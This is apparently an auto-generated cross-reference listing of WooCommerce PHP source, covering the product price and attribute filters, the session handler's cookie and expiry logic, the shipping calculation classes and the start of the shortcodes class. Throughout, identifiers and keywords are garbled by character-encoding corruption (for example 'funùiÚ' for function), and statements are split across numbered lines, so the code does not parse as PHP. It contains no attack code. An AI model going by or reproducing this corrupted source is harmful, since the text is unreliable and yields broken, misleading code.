( $posts, $matched_products_from_attribute );

712 
$m©ched_´oduùs_äom_©Œibu‹
 = 
$po¡s
;

714 
$f‹»d
 = 
Œue
;

719 iàĞĞ
$m©ched_´oduùs
[ 
$d©a
['qu”y_ty³'] ] ) > 0 || 
$f‹»d_©Œibu‹
[ $d©a['qu”y_ty³'] ] ==ğ
Œue
 ) {

720 
$m©ched_´oduùs
[ 
$d©a
['qu”y_ty³'] ] = ( $d©a['qu”y_ty³'] =ğ'Ü' ) ? 
	`¬¿y_m”ge
Ğ
$m©ched_´oduùs_äom_©Œibu‹
, $m©ched_´oduùs[ $d©a['qu”y_ty³'] ] ) : 
	`¬¿y_š‹r£ù
( $matched_products_from_attribute, $matched_products[ $data['query_type'] ] );

722 
$m©ched_´oduùs
[ 
$d©a
['qu”y_ty³'] ] = 
$m©ched_´oduùs_äom_©Œibu‹
;

725 
$f‹»d_©Œibu‹
[ 
$d©a
['qu”y_ty³'] ] = 
Œue
;

727 
$this
->
f‹»d_´oduù_ids_fÜ_xÚomy
[ 
$©Œibu‹
 ] = 
$m©ched_´oduùs_äom_©Œibu‹
;

731 iàĞ
$f‹»d_©Œibu‹
['and'] && $filtered_attribute['or'] )

732 
$»suÉs
 = 
	`¬¿y_š‹r£ù
Ğ
$m©ched_´oduùs
[ 'and' ], $matched_products[ 'or' ] );

734 
$»suÉs
 = 
	`¬¿y_m”ge
Ğ
$m©ched_´oduùs
[ 'and' ], $matched_products[ 'or' ] );

736 iàĞ
$f‹»d
 ) {

738 
	`WC
()->
qu”y
->
Ïy”ed_Çv_po¡__š
 = 
$»suÉs
;

739 
	`WC
()->
qu”y
->
Ïy”ed_Çv_po¡__š
[] = 0;

741 iàĞĞ
$f‹»d_po¡s
 ) == 0 ) {

742 
$f‹»d_po¡s
 = 
$»suÉs
;

743 
$f‹»d_po¡s
[] = 0;

745 
$f‹»d_po¡s
 = 
	`¬¿y_š‹r£ù
Ğ$f‹»d_po¡s, 
$»suÉs
 );

746 
$f‹»d_po¡s
[] = 0;

751  (
¬¿y
è
$f‹»d_po¡s
;

752 
	}
}

757 
public
 
funùiÚ
 
	$´iû_f‹r_š™
() {

758 iàĞ
	`is_aùive_widg‘
Ğ
çl£
, f®£, 'woocomm”û_´iû_f‹r', 
Œue
 ) && ! 
	`is_admš
() ) {

760 
$suffix
 = 
	`defšed
Ğ'SCRIPT_DEBUG' ) && 
SCRIPT_DEBUG
 ? '' : '.min';

762 
	`wp_»gi¡”_süt
Ğ'wc-´iû-¦id”', 
	`WC
()->
	`¶ugš_u¾
(è. '/as£ts/js/äÚ‹nd/´iû-¦id”' . 
$suffix
 . '.js', 
	`¬¿y
Ğ'jqu”y-ui-¦id”' ), 
WC_VERSION
, 
Œue
 );

764 
	`wp_loÿlize_süt
Ğ'wc-´iû-¦id”', 'woocomm”û_´iû_¦id”_·¿ms', 
	`¬¿y
(

765 'cu¼’cy_symbŞ' => 
	`g‘_woocomm”û_cu¼’cy_symbŞ
(),

766 'cu¼’cy_pos' => 
	`g‘_İtiÚ
( 'woocommerce_currency_pos' ),

767 'mš_´iû' => 
	`is£t
Ğ
$_GET
['mš_´iû'] ) ? 
	`esc_©Œ
( $_GET['min_price'] ) : '',

768 'max_´iû' => 
	`is£t
Ğ
$_GET
['max_´iû'] ) ? 
	`esc_©Œ
( $_GET['max_price'] ) : ''

771 
	`add_f‹r
Ğ'loİ_shİ_po¡_š', 
	`¬¿y
Ğ
$this
, 'price_filter' ) );

773 
	}
}

781 
public
 
funùiÚ
 
	$´iû_f‹r
Ğ
$f‹»d_po¡s
 ) {

782 
glob®
 
$wpdb
;

784 iàĞ
	`is£t
Ğ
$_GET
['max_price'] ) && isset( $_GET['min_price'] ) ) {

786 
$m©ched_´oduùs
 = 
	`¬¿y
();

787 
$mš
 = 
	`æßtv®
Ğ
$_GET
['min_price'] );

788 
$max
 = 
	`æßtv®
Ğ
$_GET
['max_price'] );

790 
$m©ched_´oduùs_qu”y
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_´iû_f‹r_»suÉs', 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
("

791 
SELECT
 
DISTINCT
 
ID
, 
po¡_·»Á
, 
po¡_ty³
 
FROM
 
$wpdb
->
po¡s


792 
INNER
 
JOIN
 
$wpdb
->
po¡m‘a
 
ON
 
ID
 = 
po¡_id


793 
WHERE
 
po¡_ty³
 
	`IN
 ( '´oduù', '´oduù_v¬ŸtiÚ' ) 
AND
 
po¡_¡©us
 = 'publish' AND 
m‘a_key
 = %
s
 AND 
m‘a_v®ue
 
BETWEEN
 %
d
 AND %d

796 iàĞ
$m©ched_´oduùs_qu”y
 ) {

797 
	`fÜ—ch
 ( 
$m©ched_´oduùs_qu”y
 
as
 
$´oduù
 ) {

798 iàĞ
$´oduù
->
po¡_ty³
 == 'product' )

799 
$m©ched_´oduùs
[] = 
$´oduù
->
ID
;

800 iàĞ
$´oduù
->
po¡_·»Á
 > 0 && ! 
	`š_¬¿y
Ğ$´oduù->po¡_·»Á, 
$m©ched_´oduùs
 ) )

801 
$m©ched_´oduùs
[] = 
$´oduù
->
po¡_·»Á
;

806 iàĞĞ
$f‹»d_po¡s
 ) == 0) {

807 
$f‹»d_po¡s
 = 
$m©ched_´oduùs
;

808 
$f‹»d_po¡s
[] = 0;

810 
$f‹»d_po¡s
 = 
	`¬¿y_š‹r£ù
Ğ$f‹»d_po¡s, 
$m©ched_´oduùs
 );

811 
$f‹»d_po¡s
[] = 0;

816  (
¬¿y
è
$f‹»d_po¡s
;

817 
	}
}

821 
	g’dif
;

823  
Ãw
 
WC_Qu”y
();

	@includes/class-wc-session-handler.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

20 şas 
	cWC_SessiÚ_HªdËr
 
ex‹nds
 
	mWC_SessiÚ
 {

23 
´iv©e
 
	m$_cook›
;

26 
´iv©e
 
	m$_£ssiÚ_expœšg
;

29 
´iv©e
 
	m$_£ssiÚ_expœ©iÚ
;

37 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

38 
$this
->
_cook›
 = 'wp_woocomm”û_£ssiÚ_' . 
COOKIEHASH
;

40 iàĞ
$cook›
 = 
$this
->
	`g‘_£ssiÚ_cook›
() ) {

41 
$this
->
_cu¡om”_id
 = 
$cook›
[0];

42 
$this
->
_£ssiÚ_expœ©iÚ
 = 
$cook›
[1];

43 
$this
->
_£ssiÚ_expœšg
 = 
$cook›
[2];

46 iàĞ
	`time
(è> 
$this
->
_£ssiÚ_expœšg
 ) {

47 
$this
->
	`£t_£ssiÚ_expœ©iÚ
();

48 
$£ssiÚ_expœy_İtiÚ
 = '_wc_£ssiÚ_expœes_' . 
$this
->
_cu¡om”_id
;

50 iàĞ
çl£
 ==ğ
	`g‘_İtiÚ
Ğ
$£ssiÚ_expœy_İtiÚ
 ) ) {

51 
	`add_İtiÚ
Ğ
$£ssiÚ_expœy_İtiÚ
, 
$this
->
_£ssiÚ_expœ©iÚ
, '', 'no' );

53 
	`upd©e_İtiÚ
Ğ
$£ssiÚ_expœy_İtiÚ
, 
$this
->
_£ssiÚ_expœ©iÚ
 );

58 
$this
->
	`£t_£ssiÚ_expœ©iÚ
();

59 
$this
->
_cu¡om”_id
 = $this->
	`g’”©e_cu¡om”_id
();

62 
$this
->
_d©a
 = $this->
	`g‘_£ssiÚ_d©a
();

65 
	`add_aùiÚ
Ğ'woocomm”û_£t_ÿ¹_cook›s', 
	`¬¿y
Ğ
$this
, 'set_customer_session_cookie' ), 10 );

66 
	`add_aùiÚ
Ğ'woocomm”û_ş—nup_£ssiÚs', 
	`¬¿y
Ğ
$this
, 'cleanup_sessions' ), 10 );

67 
	`add_aùiÚ
Ğ'shutdown', 
	`¬¿y
Ğ
$this
, 'save_data' ), 20 );

77 
public
 
funùiÚ
 
	$£t_cu¡om”_£ssiÚ_cook›
Ğ
$£t
 ) {

78 iàĞ
$£t
 ) {

80 
$to_hash
 = 
$this
->
_cu¡om”_id
 . $this->
_£ssiÚ_expœ©iÚ
;

81 
$cook›_hash
 = 
	`hash_hmac
Ğ'md5', 
$to_hash
, 
	`wp_hash
( $to_hash ) );

82 
$cook›_v®ue
 = 
$this
->
_cu¡om”_id
 . '||' . $this->
_£ssiÚ_expœ©iÚ
 . '||' . $this->
_£ssiÚ_expœšg
 . '||' . 
$cook›_hash
;

85 
	`wc_£tcook›
Ğ
$this
->
_cook›
, 
$cook›_v®ue
, $this->
_£ssiÚ_expœ©iÚ
, 
	`­¶y_f‹rs
Ğ'wc_£ssiÚ_u£_£cu»_cook›', 
çl£
 ) );

87 
	}
}

95 
public
 
funùiÚ
 
	$£t_£ssiÚ_expœ©iÚ
() {

96 
$this
->
_£ssiÚ_expœšg
 = 
	`time
(è+ 
	`štv®
Ğ
	`­¶y_f‹rs
( 'wc_session_expiring', 60 * 60 * 47 ) );

97 
$this
->
_£ssiÚ_expœ©iÚ
 = 
	`time
(è+ 
	`štv®
Ğ
	`­¶y_f‹rs
( 'wc_session_expiration', 60 * 60 * 48 ) );

98 
	}
}

106 
public
 
funùiÚ
 
	$g’”©e_cu¡om”_id
() {

107 iàĞ
	`is_u£r_logged_š
() )

108  
	`g‘_cu¼’t_u£r_id
();

110  
	`wp_g’”©e_·sswÜd
Ğ32, 
çl£
 );

111 
	}
}

119 
public
 
funùiÚ
 
	$g‘_£ssiÚ_cook›
() {

120 iàĞ
	`em±y
Ğ
$_COOKIE
[ 
$this
->
_cook›
 ] ) )

121  
çl£
;

123 
	`li¡
Ğ
$cu¡om”_id
, 
$£ssiÚ_expœ©iÚ
, 
$£ssiÚ_expœšg
, 
$cook›_hash
 ) = 
	`ex¶ode
Ğ'||', 
$_COOKIE
[ 
$this
->
_cook›
 ] );

126 
$to_hash
 = 
$cu¡om”_id
 . 
$£ssiÚ_expœ©iÚ
;

127 
$hash
 = 
	`hash_hmac
Ğ'md5', 
$to_hash
, 
	`wp_hash
( $to_hash ) );

129 iàĞ
$hash
 !ğ
$cook›_hash
 )

130  
çl£
;

132  
	`¬¿y
Ğ
$cu¡om”_id
, 
$£ssiÚ_expœ©iÚ
, 
$£ssiÚ_expœšg
, 
$cook›_hash
 );

133 
	}
}

141 
public
 
funùiÚ
 
	$g‘_£ssiÚ_d©a
() {

142  (
¬¿y
è
	`g‘_İtiÚ
Ğ'_wc_£ssiÚ_' . 
$this
->
_cu¡om”_id
, 
	`¬¿y
() );

143 
	}
}

151 
public
 
funùiÚ
 
	$§ve_d©a
() {

153 iàĞ
$this
->
_dœty
 ) {

155 
$£ssiÚ_İtiÚ
 = '_wc_£ssiÚ_' . 
$this
->
_cu¡om”_id
;

156 
$£ssiÚ_expœy_İtiÚ
 = '_wc_£ssiÚ_expœes_' . 
$this
->
_cu¡om”_id
;

158 iàĞ
çl£
 ==ğ
	`g‘_İtiÚ
Ğ
$£ssiÚ_İtiÚ
 ) ) {

159 
	`add_İtiÚ
Ğ
$£ssiÚ_İtiÚ
, 
$this
->
_d©a
, '', 'no' );

160 
	`add_İtiÚ
Ğ
$£ssiÚ_expœy_İtiÚ
, 
$this
->
_£ssiÚ_expœ©iÚ
, '', 'no' );

162 
	`upd©e_İtiÚ
Ğ
$£ssiÚ_İtiÚ
, 
$this
->
_d©a
 );

165 
	}
}

173 
public
 
funùiÚ
 
	$ş—nup_£ssiÚs
() {

174 
glob®
 
$wpdb
;

176 iàĞ! 
	`defšed
( 'WP_SETUP_CONFIG' ) && ! defined( 'WP_INSTALLING' ) ) {

177 
$now
 = 
	`time
();

178 
$expœed_£ssiÚs
 = 
	`¬¿y
();

179 
$wc_£ssiÚ_expœes
 = 
$wpdb
->
	`g‘_»suÉs
( "SELECT option_name, option_value FROM $wpdb->options WHERE option_name LIKE '_wc_session_expires_%'" );

181 
	`fÜ—ch
 ( 
$wc_£ssiÚ_expœes
 
as
 
$wc_£ssiÚ_expœe
 ) {

182 iàĞ
$now
 > 
	`štv®
Ğ
$wc_£ssiÚ_expœe
->
İtiÚ_v®ue
 ) ) {

183 
$£ssiÚ_id
 = 
	`sub¡r
Ğ
$wc_£ssiÚ_expœe
->
İtiÚ_Çme
, 20 );

184 
$expœed_£ssiÚs
[] = 
$wc_£ssiÚ_expœe
->
İtiÚ_Çme
;

185 
$expœed_£ssiÚs
[] = "_wc_session_$session_id";

189 iàĞ! 
	`em±y
Ğ
$expœed_£ssiÚs
 ) ) {

190 
$expœed_£ssiÚs_chunked
 = 
	`¬¿y_chunk
Ğ
$expœed_£ssiÚs
, 100 );

191 
	`fÜ—ch
 ( 
$expœed_£ssiÚs_chunked
 
as
 
$chunk
 ) {

192 
$İtiÚ_Çmes
 = 
	`im¶ode
Ğ"','", 
$chunk
 );

193 
$wpdb
->
	`qu”y
( "DELETE FROM $wpdb->options WHERE option_name IN ('$option_names')" );

197 
	}
}

	@includes/class-wc-shipping-rate.php

1 <?
php


14 iàĞ! 
defšed
( 'ABSPATH' ) ) {

15 
	gex™
;

18 şas 
	cWC_Shpšg_R©e
 {

20 
v¬
 
	m$id
 = '';

21 
v¬
 
	m$Ïb–
 = '';

22 
v¬
 
	m$co¡
 = 0;

23 
v¬
 
	m$xes
 = 
¬¿y
();

24 
v¬
 
	m$m‘hod_id
 = '';

36 
public
 
funùiÚ
 
	$__cÚ¡ruù
Ğ
$id
, 
$Ïb–
, 
$co¡
, 
$xes
, 
$m‘hod_id
 ) {

37 
$this
->
id
 = 
$id
;

38 
$this
->
Ïb–
 = 
$Ïb–
;

39 
$this
->
co¡
 = 
$co¡
;

40 
$this
->
xes
 = 
$xes
 ? $xe : 
	`¬¿y
();

41 
$this
->
m‘hod_id
 = 
$m‘hod_id
;

50 
funùiÚ
 
	$g‘_shpšg_x
() {

51 
$xes
 = 0;

52 iàĞ
$this
->
xes
 && Ğ$this->xe è> 0 && ! 
	`WC
()->
cu¡om”
->
	`is_v©_exem±
() ) {

53 
$xes
 = 
	`¬¿y_sum
Ğ
$this
->
xes
 );

55  
$xes
;

56 
	}
}

	@includes/class-wc-shipping.php

1 <?
php


14 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Shpšg
 {

19 
v¬
 
	m$’abËd
 = 
çl£
;

22 
v¬
 
	m$shpšg_m‘hods
 = 
¬¿y
();

25 
v¬
 
	m$shpšg_tÙ®
 = 0;

28 
v¬
 
	m$shpšg_xes
 = 
¬¿y
();

31 
v¬
 
	m$shpšg_şas£s
 = 
¬¿y
();

34 
v¬
 
	m$·ckages
 = 
¬¿y
();

40 
´Ùeùed
 
	m$_š¡ªû
 = 
nuÎ
;

52 
public
 
funùiÚ
 
	$š¡ªû
() {

53 iàĞ
	`is_nuÎ
Ğ
£lf
::
$_š¡ªû
 ) )

54 
£lf
::
$_š¡ªû
 = 
Ãw
 
	`£lf
();

55  
£lf
::
$_š¡ªû
;

63 
public
 
funùiÚ
 
	$__şÚe
() {

64 
	`_došg_™_wrÚg
Ğ
__FUNCTION__
, 
	`__
( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );

65 
	}
}

72 
public
 
funùiÚ
 
	$__wakeup
() {

73 
	`_došg_™_wrÚg
Ğ
__FUNCTION__
, 
	`__
( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );

74 
	}
}

82 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

83 
$this
->
	`š™
();

84 
	}
}

91 
public
 
funùiÚ
 
	$š™
() {

92 
	`do_aùiÚ
( 'woocommerce_shipping_init' );

94 
$this
->
’abËd
 = ( 
	`g‘_İtiÚ
('woocomm”û_ÿlc_shpšg'è=ğ'no' ) ? 
çl£
 : 
Œue
;

95 
	}
}

108 
public
 
funùiÚ
 
lßd_shpšg_m‘hods
Ğ
$·ckage
 = 
	$¬¿y
() ) {

110 
$this
->
	`uÄegi¡”_shpšg_m‘hods
();

113 
	`do_aùiÚ
Ğ'woocomm”û_lßd_shpšg_m‘hods', 
$·ckage
 );

116 
$shpšg_m‘hods_to_lßd
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_m‘hods', 
	`¬¿y
(

124 
	`fÜ—ch
 ( 
$shpšg_m‘hods_to_lßd
 
as
 
$m‘hod
 )

125 
$this
->
	`»gi¡”_shpšg_m‘hod
Ğ
$m‘hod
 );

127 
$this
->
	`sÜt_shpšg_m‘hods
();

129  
$this
->
shpšg_m‘hods
;

130 
	}
}

139 
public
 
funùiÚ
 
	$»gi¡”_shpšg_m‘hod
Ğ
$m‘hod
 ) {

141 iàĞ! 
	`is_objeù
Ğ
$m‘hod
 ) )

142 
$m‘hod
 = 
Ãw
 
	`$m‘hod
();

144 
$id
 = 
	`em±y
Ğ
$m‘hod
->
š¡ªû_id
 ) ? $m‘hod->
id
 : $method->instance_id;

146 
$this
->
shpšg_m‘hods
[ 
$id
 ] = 
$m‘hod
;

147 
	}
}

155 
public
 
funùiÚ
 
	$uÄegi¡”_shpšg_m‘hods
() {

156 
	`un£t
Ğ
$this
->
shpšg_m‘hods
 );

157 
	}
}

167 
public
 
funùiÚ
 
	$sÜt_shpšg_m‘hods
() {

169 
$sÜ‹d_shpšg_m‘hods
 = 
	`¬¿y
();

172 
$Üd”šg
 = (
¬¿y
è
	`g‘_İtiÚ
('woocommerce_shipping_method_order');

173 
$Üd”_’d
 = 999;

176 
	`fÜ—ch
 ( 
$this
->
shpšg_m‘hods
 
as
 
$m‘hod
 ) {

178 iàĞ
	`is£t
Ğ
$Üd”šg
[ 
$m‘hod
->
id
 ] ) && 
	`is_num”ic
( $ordering[ $method->id ] ) ) {

180 
$sÜ‹d_shpšg_m‘hods
[ 
$Üd”šg
[ 
$m‘hod
->
id
 ] ][] = $method;

183 
$sÜ‹d_shpšg_m‘hods
[ 
$Üd”_’d
 ][] = 
$m‘hod
;

187 
	`ksÜt
Ğ
$sÜ‹d_shpšg_m‘hods
 );

189 
$this
->
shpšg_m‘hods
 = 
	`¬¿y
();

191 
	`fÜ—ch
 ( 
$sÜ‹d_shpšg_m‘hods
 
as
 
$m‘hods
 )

192 
	`fÜ—ch
 ( 
$m‘hods
 
as
 
$m‘hod
 ) {

193 
$id
 = 
	`em±y
Ğ
$m‘hod
->
š¡ªû_id
 ) ? $m‘hod->
id
 : $method->instance_id;

194 
$this
->
shpšg_m‘hods
[ 
$id
 ] = 
$m‘hod
;

197  
$this
->
shpšg_m‘hods
;

198 
	}
}

208 
public
 
funùiÚ
 
	$g‘_shpšg_m‘hods
() {

209  
$this
->
shpšg_m‘hods
;

210 
	}
}

220 
public
 
funùiÚ
 
	$g‘_shpšg_şas£s
() {

221 iàĞ
	`em±y
Ğ
$this
->
shpšg_şas£s
 ) )

222 
$this
->
shpšg_şas£s
 = ( 
$şas£s
 = 
	`g‘_‹rms
Ğ'´oduù_shpšg_şass', 
	`¬¿y
( 'hide_empty' => '0' ) ) ) ? $classes :‡rray();

224  
$this
->
shpšg_şas£s
;

225 
	}
}

235 
public
 
funùiÚ
 
ÿlcuÏ‹_shpšg
Ğ
$·ckages
 = 
	$¬¿y
() ) {

236 iàĞ! 
$this
->
’abËd
 || 
	`em±y
Ğ
$·ckages
 ) )

239 
$this
->
shpšg_tÙ®
 = 
nuÎ
;

240 
$this
->
shpšg_xes
 = 
	`¬¿y
();

241 
$this
->
·ckages
 = 
	`¬¿y
();

244 
$·ckage_keys
 = 
	`¬¿y_keys
Ğ
$·ckages
 );

245 
$·ckage_keys_size
 = Ğ
$·ckage_keys
 );

247  
$i
 = 0; $˜< 
$·ckage_keys_size
; $i ++ )

248 
$this
->
·ckages
[ 
$·ckage_keys
[ 
$i
 ] ] = $this->
	`ÿlcuÏ‹_shpšg_fÜ_·ckage
Ğ
$·ckages
[ $package_keys[ $i ] ] );

251 
$cho£n_m‘hods
 = 
	`WC
()->
£ssiÚ
->
	`g‘
( 'chosen_shipping_methods' );

252 
$m‘hod_couÁs
 = 
	`WC
()->
£ssiÚ
->
	`g‘
( 'shipping_method_counts' );

255 
	`fÜ—ch
 ( 
$this
->
·ckages
 
as
 
$i
 => 
$·ckage
 ) {

257 
$_ch—³¡_co¡
 = 
çl£
;

258 
$_ch—³¡_m‘hod
 = 
çl£
;

259 
$cho£n_m‘hod
 = 
çl£
;

260 
$m‘hod_couÁ
 = 
çl£
;

262 iàĞ! 
	`em±y
Ğ
$cho£n_m‘hods
[ 
$i
 ] ) )

263 
$cho£n_m‘hod
 = 
$cho£n_m‘hods
[ 
$i
 ];

265 iàĞ! 
	`em±y
Ğ
$m‘hod_couÁs
[ 
$i
 ] ) )

266 
$m‘hod_couÁ
 = 
$m‘hod_couÁs
[ 
$i
 ];

269 
$_avaabË_m‘hods
 = 
$·ckage
['rates'];

271 iàĞĞ
$_avaabË_m‘hods
 ) > 0 ) {

274 iàĞ
	`em±y
Ğ
$cho£n_m‘hod
 ) || ! 
	`is£t
Ğ
$_avaabË_m‘hods
[ $cho£n_m‘hod ] ) || 
$m‘hod_couÁ
 != ( $_available_methods ) ) {

276 
$cho£n_m‘hod
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_cho£n_m‘hod', 
	`g‘_İtiÚ
Ğ'woocomm”û_deçuÉ_shpšg_m‘hod' ), 
$_avaabË_m‘hods
 );

279 iàĞ! 
	`em±y
Ğ
$cho£n_m‘hod
 ) && ! 
	`is£t
Ğ
$_avaabË_m‘hods
[ $chosen_method ] ) ) {

280 
	`fÜ—ch
 ( 
$_avaabË_m‘hods
 
as
 
$m‘hod_id
 => 
$m‘hod
 ) {

281 iàĞ
	`¡½os
Ğ
$m‘hod
->
id
, 
$cho£n_m‘hod
 ) === 0 ) {

282 
$cho£n_m‘hod
 = 
$m‘hod
->
id
;

288 iàĞ
	`em±y
Ğ
$cho£n_m‘hod
 ) || ! 
	`is£t
Ğ
$_avaabË_m‘hods
[ $chosen_method ] ) ) {

290 
	`fÜ—ch
 ( 
$_avaabË_m‘hods
 
as
 
$m‘hod_id
 => 
$m‘hod
 ) {

291 iàĞ
$m‘hod
->
co¡
 < 
$_ch—³¡_co¡
 || ! 
	`is_num”ic
( $_cheapest_cost ) ) {

292 
$_ch—³¡_co¡
 = 
$m‘hod
->
co¡
;

293 
$_ch—³¡_m‘hod
 = 
$m‘hod_id
;

296 
$cho£n_m‘hod
 = 
$_ch—³¡_m‘hod
;

300 
$cho£n_m‘hods
[ 
$i
 ] = 
$cho£n_m‘hod
;

301 
$m‘hod_couÁs
[ 
$i
 ] = Ğ
$_avaabË_m‘hods
 );

304 
	`do_aùiÚ
Ğ'woocomm”û_shpšg_m‘hod_cho£n', 
$cho£n_m‘hod
 );

308 iàĞ
$cho£n_m‘hod
 ) {

309 
$¿‹
 = 
$_avaabË_m‘hods
[ 
$cho£n_m‘hod
 ];

312 
$this
->
shpšg_tÙ®
 +ğ
$¿‹
->
co¡
;

314 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
$this
->
shpšg_xes
 + 
$¿‹
->
xes
 ) 
as
 
$key
 ) {

315 
$this
->
shpšg_xes
[ 
$key
 ] = ( 
	`is£t
Ğ
$¿‹
->
xes
[$key] ) ? $rate->taxes[$key] : 0 ) + ( isset( $this->shipping_taxes[$key] ) ? $this->shipping_taxes[$key] : 0 );

322 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'cho£n_shpšg_m‘hods', 
$cho£n_m‘hods
 );

323 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'shpšg_m‘hod_couÁs', 
$m‘hod_couÁs
 );

324 
	}
}

336 
public
 
funùiÚ
 
ÿlcuÏ‹_shpšg_fÜ_·ckage
Ğ
$·ckage
 = 
	$¬¿y
() ) {

337 iàĞ! 
$this
->
’abËd
 )  
çl£
;

338 iàĞ! 
$·ckage
 )  
çl£
;

341 
$·ckage_hash
 = 'wc_sh_' . 
	`md5
Ğ
	`jsÚ_’code
Ğ
$·ckage
 ) );

343 iàĞ
çl£
 ==ğĞ
$¡Üed_¿‹s
 = 
	`g‘_Œªs›Á
Ğ
$·ckage_hash
 ) ) ) {

346 
$·ckage
['¿‹s'] = 
	`¬¿y
();

348 
	`fÜ—ch
 ( 
$this
->
	`lßd_shpšg_m‘hods
Ğ
$·ckage
 ) 
as
 
$shpšg_m‘hod
 ) {

350 iàĞ
$shpšg_m‘hod
->
	`is_avaabË
Ğ
$·ckage
 ) && ( 
	`em±y
Ğ$·ckage['sh_vŸ'] ) || 
	`š_¬¿y
Ğ$shpšg_m‘hod->
id
, $package['ship_via'] ) ) ) {

353 
$shpšg_m‘hod
->
¿‹s
 = 
	`¬¿y
();

356 
$shpšg_m‘hod
->
	`ÿlcuÏ‹_shpšg
Ğ
$·ckage
 );

359 iàĞ! 
	`em±y
Ğ
$shpšg_m‘hod
->
¿‹s
 ) && 
	`is_¬¿y
( $shipping_method->rates ) )

360 
	`fÜ—ch
 ( 
$shpšg_m‘hod
->
¿‹s
 
as
 
$¿‹
 )

361 
$·ckage
['¿‹s'][ 
$¿‹
->
id
 ] = $rate;

366 
$·ckage
['¿‹s'] = 
	`­¶y_f‹rs
( 'woocommerce_package_rates', $package['rates'], $package );

369 
	`£t_Œªs›Á
Ğ
$·ckage_hash
, 
$·ckage
['rates'], 60 * 60 );

373 
$·ckage
['¿‹s'] = 
$¡Üed_¿‹s
;

377  
$·ckage
;

378 
	}
}

384 
public
 
funùiÚ
 
	$g‘_·ckages
() {

385  
$this
->
·ckages
;

386 
	}
}

397 
public
 
funùiÚ
 
	$»£t_shpšg
() {

398 
	`un£t
Ğ
	`WC
()->
£ssiÚ
->
cho£n_shpšg_m‘hods
 );

399 
$this
->
shpšg_tÙ®
 = 
nuÎ
;

400 
$this
->
shpšg_xes
 = 
	`¬¿y
();

401 
$this
->
·ckages
 = 
	`¬¿y
();

402 
	}
}

413 
public
 
funùiÚ
 
	$´oûss_admš_İtiÚs
() {

415 
$deçuÉ_shpšg_m‘hod
 = ( 
	`is£t
Ğ
$_POST
['deçuÉ_shpšg_m‘hod'] ) ) ? 
	`esc_©Œ
( $_POST['default_shipping_method'] ) : '';

416 
$m‘hod_Üd”
 = ( 
	`is£t
Ğ
$_POST
['method_order'] ) ) ? $_POST['method_order'] : '';

418 
$Üd”
 = 
	`¬¿y
();

420 iàĞ
	`is_¬¿y
Ğ
$m‘hod_Üd”
 ) && ( $method_order ) > 0 ) {

421 
$loİ
 = 0;

422 
	`fÜ—ch
 (
$m‘hod_Üd”
 
as
 
$m‘hod_id
) {

423 
$Üd”
[
$m‘hod_id
] = 
$loİ
;

424 
$loİ
++;

428 
	`upd©e_İtiÚ
Ğ'woocomm”û_deçuÉ_shpšg_m‘hod', 
$deçuÉ_shpšg_m‘hod
 );

429 
	`upd©e_İtiÚ
Ğ'woocomm”û_shpšg_m‘hod_Üd”', 
$Üd”
 );

430 
	}
}

442 
funùiÚ
 
	$woocomm”û_»gi¡”_shpšg_m‘hod
Ğ
$shpšg_m‘hod
 ) {

443 
$GLOBALS
['woocomm”û']->
shpšg
->
	`»gi¡”_shpšg_m‘hod
Ğ
$shpšg_m‘hod
 );

444 
	}
}

	@includes/class-wc-shortcodes.php

1 <?
php


11 şas 
	cWC_ShÜtcodes
 {

16 
public
 
funùiÚ
 
	$š™
() {

18 
$shÜtcodes
 = 
	`¬¿y
(

19 '´oduù' => 
__CLASS__
 . '::product',

20 '´oduù_·ge' => 
__CLASS__
 . '::product_page',

21 '´oduù_ÿ‹gÜy' => 
__CLASS__
 . '::product_category',

22 '´oduù_ÿ‹gÜ›s' => 
__CLASS__
 . '::product_categories',

23 'add_to_ÿ¹' => 
__CLASS__
 . '::product_add_to_cart',

24 'add_to_ÿ¹_u¾' => 
__CLASS__
 . '::product_add_to_cart_url',

25 '´oduùs' => 
__CLASS__
 . '::products',

26 '»ûÁ_´oduùs' => 
__CLASS__
 . '::recent_products',

27 '§Ë_´oduùs' => 
__CLASS__
 . '::sale_products',

28 'be¡_£Îšg_´oduùs' => 
__CLASS__
 . '::best_selling_products',

29 'tİ_¿‹d_´oduùs' => 
__CLASS__
 . '::top_rated_products',

30 'ã©u»d_´oduùs' => 
__CLASS__
 . '::featured_products',

31 '´oduù_©Œibu‹' => 
__CLASS__
 . '::product_attribute',

32 '»Ï‹d_´oduùs' => 
__CLASS__
 . '::related_products',

33 'shİ_mes§ges' => 
__CLASS__
 . '::shop_messages',

34 'woocomm”û_Üd”_Œackšg' => 
__CLASS__
 . '::order_tracking',

35 'woocomm”û_ÿ¹' => 
__CLASS__
 . '::cart',

36 'woocomm”û_checkout' => 
__CLASS__
 . '::checkout',

37 'woocomm”û_my_accouÁ' => 
__CLASS__
 . '::my_account',

40 
	`fÜ—ch
 ( 
$shÜtcodes
 
as
 
$shÜtcode
 => 
$funùiÚ
 ) {

41 
	`add_shÜtcode
Ğ
	`­¶y_f‹rs
Ğ"{$shÜtcode}_shÜtcode_g", 
$shÜtcode
 ), 
$funùiÚ
 );

45 
	`add_shÜtcode
Ğ'woocomm”û_mes§ges', 
__CLASS__
 . '::shop_messages' );

55 
public
 
funùiÚ
 
	`shÜtcode_w¿µ”
(

56 
$funùiÚ
,

57 
$©ts
 = 
	`¬¿y
(),

58 
$w¿µ”
 = 
	`¬¿y
(

60 'befÜe' => 
nuÎ
,

61 'aá”' => 
nuÎ


64 
	`ob_¡¬t
();

66 
$befÜe
 = 
	`em±y
Ğ
$w¿µ”
['befÜe'] ) ? '<div cÏss="' . 
	`esc_©Œ
( $wrapper['class'] ) . '">' : $wrapper['before'];

67 
$aá”
 = 
	`em±y
Ğ
$w¿µ”
['after'] ) ? '</div>' : $wrapper['after'];

69 
echo
 
$befÜe
;

70 
	`ÿÎ_u£r_func
Ğ
$funùiÚ
, 
$©ts
 );

71 
echo
 
